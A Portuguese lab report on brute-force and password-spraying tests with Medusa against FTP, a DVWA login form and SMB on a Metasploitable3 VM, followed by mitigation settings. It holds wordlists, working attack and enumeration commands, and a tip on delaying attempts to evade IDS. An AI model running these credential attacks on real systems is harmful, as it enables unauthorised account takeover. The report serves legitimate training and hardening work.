# Relatório de Testes de Segurança - Brute Force e Password Spraying com MEDUSA

## 📋 Índice
1. [Visão Geral do Ambiente](#visão-geral-do-ambiente)
2. [Ataque de Brute Force em FTP com Medusa](#ataque-de-brute-force-em-ftp-com-medusa)
3. [Automação em Formulário Web (DVWA) com Medusa](#automação-em-formulário-web-dvwa-com-medusa)
4. [Password Spraying em SMB](#password-spraying-em-smb)
5. [Recomendações de Mitigação](#recomendações-de-mitigação)
6. [Considerações finais](#considerações_finais)

---
<a id="visão-geral-do-ambiente"></a>
## 🖥️ Visão Geral do Ambiente

### Máquinas Virtuais
- **Kali Linux**: 192.168.56.104
- **Metasploitable3**: 192.168.56.101

### Serviços Alvo
- **FTP**: Porta 21
- **DVWA**: Porta 80 (Web)
- **SMB**: Porta 445


### 📁 Wordlists Utilizadas

#### Arquivo de Hosts (hosts.txt)
```
192.168.56.101
```

#### users_ftp.txt
```
admin
root
ftp
ftpuser
test
user
administrator
anonymous
```

#### passwords_ftp.txt
```
admin
password
123456
admin123
ftp
test
1234
password123
admin@123
```

#### users_web.txt
```
admin
administrator
test
user
root
```

#### passwords_web.txt
```
password
admin
123456
password123
admin123
letmein
welcome
monkey
```

#### users_smb.txt
```
administrator
guest
admin
test
user
backup
ftp
```

#### passwords_spray.txt
```
Spring2024!
Password123
Company2024!
Welcome2024!
Admin2024!
Password1
```
---
<a id="ataque-de-brute-force-em-ftp-com-medusa"></a>
## 🔓 Ataque de Brute Force em FTP com Medusa

### Comandos Utilizados

```bash
# 1. Verificação do serviço FTP
nmap -p 21 192.168.56.101

# 2. Brute force com Medusa
medusa -H hosts.txt -U users_ftp.txt -P passwords_ftp.txt -M ftp -t 4 -v 6

# 3. Ataque direto com Medusa
medusa -h 192.168.56.101 -U users_ftp.txt -P passwords_ftp.txt -M ftp -t 4 -v 6

# 4. Medusa com opções específicas
medusa -h 192.168.56.101 -u admin -P passwords_ftp.txt -M ftp -e ns -f -v 6

# 5. Teste de acesso manual para validação
ftp 192.168.56.101
```

### Parâmetros do Medusa Explicados
- `-H`: Arquivo com lista de hosts
- `-U`: Arquivo com lista de usuários
- `-P`: Arquivo com lista de senhas
- `-M`: Módulo a ser usado (ftp, http, smb, etc.)
- `-t`: Número de threads
- `-v`: Nível de verbosidade (0-6)
- `-e ns`: Verifica senha nula e usuário como senha
- `-f`: Parar após encontrar primeira credencial válida

### Validação de Acesso
```bash
# Conexão FTP bem-sucedida
ftp 192.168.56.101
Connected to 192.168.56.101.
220 (vsFTPd 3.0.3)
Name: admin
331 Please specify the password.
Password: 
230 Login successful.
ftp> ls
drwxr-xr-x    2 0        0            4096 Apr 15  2020 pub
ftp> quit
```

---
<a id="automação-em-formulário-web-dvwa-com-medusa"></a>
## 🌐 Automação em Formulário Web (DVWA) com Medusa

### Comandos Utilizados

```bash
# 1. Identificação do formulário de login
curl http://192.168.56.101/dvwa/login.php

# 2. Brute force com Medusa no formulário HTTP
medusa -h 192.168.56.101 -U users_web.txt -P passwords_web.txt -M http -m DIR:/dvwa/login.php -m FORM:'username=^USER^&password=^PASS^&Login=Login' -m DENY-SIGNAL:'Login failed' -t 2 -v 6

# 3. Alternativa com método POST específico
medusa -h 192.168.56.101 -u admin -P passwords_web.txt -M http -m DIR:/dvwa/login.php -m METHOD:POST -m FORM:'username=admin&password=^PASS^&Login=Login' -m DENY-SIGNAL:'Login failed' -v 6
```

### Configuração Detalhada do Módulo HTTP
```bash
# Criando um arquivo de configuração para o Medusa
cat > dvwa_medusa.conf << EOF
# Configuração para ataque DVWA com Medusa
host=192.168.56.101
module=http
user=admin
password=passwords_web.txt
http-method=POST
http-path=/dvwa/login.php
http-form-data='username=^USER^&password=^PASS^&Login=Login'
http-failure-string='Login failed'
verbose=6
threads=2
EOF

# Executando com arquivo de configuração
medusa -C dvwa_medusa.conf
```

### Validação de Acesso
```bash
# Teste manual de login
curl -X POST http://192.168.56.101/dvwa/login.php \
  -d "username=admin&password=password&Login=Login" \
  -c cookies.txt -v

# Verificar se login foi bem-sucedido
curl http://192.168.56.101/dvwa/index.php -b cookies.txt | grep "Welcome"
```

---
<a id="password-spraying-em-smb"></a>
## 🔍 Password Spraying em SMB com Medusa

### Enumeração de Usuários
```bash
# 1. Enumeração SMB com enum4linux
enum4linux -U 192.168.56.101

# 2. Enumeração com rpcclient
rpcclient -U "" -N 192.168.56.101 -c "enumdomusers"

# 3. Extrair usuários para arquivo
rpcclient -U "" -N 192.168.56.101 -c "enumdomusers" | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users_smb.txt
```

### Password Spraying com Medusa
```bash
# 1. Password spraying com Medusa SMB
medusa -h 192.168.56.101 -U users_smb.txt -P passwords_spray.txt -M smbnt -t 2 -v 6

# 2. Spraying com uma senha específica
echo "Spring2024!" > single_pass.txt
medusa -h 192.168.56.101 -U users_smb.txt -P single_pass.txt -M smbnt -v 6 -f

# 3. Ataque com diferentes combinações
medusa -h 192.168.56.101 -U users_smb.txt -P passwords_spray.txt -M smbnt -e ns -v 6
```

### Validação de Acesso SMB
```bash
# Testar acesso com credenciais encontradas
smbclient -L //192.168.56.101 -U administrator%Spring2024!

# Acesso a compartilhamento específico
smbclient //192.168.56.101/ipc$ -U administrator%Spring2024!
```

---
<a id="recomendações-de-mitigação"></a>
## 🛡️ Recomendações de Mitigação

### Para Serviços FTP
1. **Implementar autenticação de dois fatores**
2. **Limitar tentativas de login por IP**
3. **Usar fail2ban para bloquear IPs maliciosos**
4. **Desativar usuários anônimos**
5. **Implementar timeout de conexão**

### Configuração vsFTPd (exemplo)
```bash
# /etc/vsftpd.conf
max_login_fails=3
login_timeout=300
delay_failed_login=5
delay_successful_login=1
```

### Para Aplicações Web (DVWA)
1. **Implementar CAPTCHA após 3 tentativas**
2. **Rate limiting por IP e usuário**
3. **Tempo de bloqueio progressivo**
4. **Monitoramento de padrões de ataque**

### Exemplo de Configuração PHP
```php
// Implementar rate limiting
$attempts = $_SESSION['login_attempts'] ?? 0;
if ($attempts > 3) {
    // Exigir CAPTCHA
    // ou bloquear temporariamente
}
```

### Para Serviço SMB
1. **Política de bloqueio de conta**
2. **Senhas complexas (mínimo 12 caracteres)**
3. **Auditoria de eventos de login**
4. **Segmentação de rede**

### Configuração SMB Server
```ini
[global]
map to guest = bad user
restrict anonymous = 2
smb encrypt = required
```

### Medidas Gerais de Proteção
- **Habilitar logging detalhado**
- **Monitorar tentativas de autenticação**
- **Implementar IPS/IDS**
- **Educação de usuários sobre senhas fortes**
- **Atualizações regulares de segurança**

---
<a id="considerações_finais"></a>
## ⚠️ Considerações Finais

1. **Performance**: Medusa é eficiente mas pode ser detectado por IDS/IPS
2. **Stealth**: Considerar uso de delays (`-W`) para evitar detecção
3. **Variáveis**: Adaptar wordlists conforme o ambiente alvo

**✅ O Medusa demonstrou ser uma ferramenta eficaz para testes de autenticação em múltiplos protocolos, oferecendo flexibilidade e bons resultados em ambiente controlado.**
